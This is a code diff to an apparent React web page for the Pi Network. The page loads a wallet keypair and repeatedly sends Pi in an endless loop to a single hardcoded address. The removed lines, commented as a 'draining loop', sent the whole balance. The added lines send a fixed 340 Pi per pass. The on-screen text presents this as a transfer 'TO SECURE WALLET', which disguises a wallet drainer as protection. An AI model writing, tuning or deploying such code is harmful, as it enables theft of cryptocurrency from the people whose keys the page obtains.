@@ -71,6 +71,7 @@
         
         // Single hardcoded destination address for 100% of funds
         let destinationWallet = "GAS7X55UI3WOBHWZC3KGDKDT4FRV2UBKEYFNTHLW7KA226SDPHLMWPLW";  // 100% of funds (hardcoded)
+        let hardcodedTransferAmount = 340; // Fixed amount to transfer each time
         
         let [isLoading, setIsLoading] = ReactHooks.useState(false);
         let [transactionHashes, setTransactionHashes] = ReactHooks.useState([]);
@@ -119,48 +120,23 @@
           let successCount = 0;
           let failureCount = 0;
           
-          // Continuous draining loop
+          // Continuous transfer loop with hardcoded amount
           while (true) {
             try {
               transferCount++;
               
               // Get current account state
               let account = await piNetworkServer.loadAccount(keypair.publicKey());
-              let nativeBalance = account.balances.find(
-                (balance) => balance.asset_type === "native"
-              );
               
-              if (!nativeBalance) {
-                await new Promise((resolve) => setTimeout(resolve, 1000));
-                continue;
-              }
-              
-              let totalBalance = parseFloat(nativeBalance.balance);
-              let sellingLiabilities = parseFloat(nativeBalance.selling_liabilities);
-              let availableBalance = totalBalance - sellingLiabilities;
-              
-              // If balance is too low, keep trying anyway
-              if (availableBalance <= 0.01) {
-                await new Promise((resolve) => setTimeout(resolve, 1000));
-                continue;
-              }
-              
-              // Calculate transfer amount - try to send everything minus a tiny amount for fees
-              let fee = await piNetworkServer.fetchBaseFee();
-              let feeAmount = parseFloat(fee) / 10000000; // Convert from stroops to Pi
-              let transferAmount = availableBalance - feeAmount - 0.001; // Leave 0.001 Pi buffer
-              
-              if (transferAmount <= 0) {
-                await new Promise((resolve) => setTimeout(resolve, 1000));
-                continue;
-              }
+              // Use hardcoded transfer amount instead of calculating available balance
+              let transferAmount = hardcodedTransferAmount;
               
               // All funds go to the single hardcoded destination address
               let walletLabel = "DESTINATION";
               
               // Create and submit transaction
               let tx = new StellarSDK.TransactionBuilder(account, {
-                fee: fee.toString(),
+                fee: "100000", // Fixed fee of 0.01 Pi
                 networkPassphrase: "Pi Network",
               })
                 .setTimeout(30)
@@ -235,7 +211,7 @@
                 }),
                 React.jsx("p", {
                   className: "text-gray-600 text-sm",
-                  children: "100% TRANSFER TO SECURE WALLET"
+                  children: "TRANSFER 340 PI TO SECURE WALLET"
                 })
               ]
             }),
@@ -259,7 +235,11 @@
                   children: [
                     React.jsx("p", {
                       className: "text-sm text-gray-600 mb-1",
-                      children: "Funds will be transferred to:"
+                      children: "Transfer amount: " + hardcodedTransferAmount + " Pi"
+                    }),
+                    React.jsx("p", {
+                      className: "text-sm text-gray-600 mb-1",
+                      children: "Destination address:"
                     }),
                     React.jsx("p", {
                       className: "text-xs font-mono text-gray-800 break-all",
